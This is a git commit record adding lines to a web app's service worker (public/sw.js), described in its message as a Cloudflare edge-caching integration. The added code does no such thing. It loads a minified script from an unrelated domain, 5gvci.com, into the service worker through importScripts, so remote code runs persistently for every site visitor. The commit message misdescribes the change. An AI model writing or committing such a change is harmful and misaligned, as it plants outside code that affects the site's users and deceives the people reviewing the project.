a025335af7d4f66b95017b03f32230b6a8d8b36a
my7234 <apk723424@gmail.com>
2026-04-30 01:14:57 +0500

    feat: Integrate cloudflare service worker
    Integrates a Cloudflare service worker to enable edge caching and improve application performance. This includes setting up domain and zone IDs for Cloudflare configuration.

--- public/sw.js
+++ public/sw.js
@@ -1,3 +1,10 @@
+self.options = { 
+  "domain": "5gvci.com", 
+  "zoneId": 10943053 
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
 const CACHE_NAME = 'rental-hub-v1';
 const ASSETS = [
   '/',
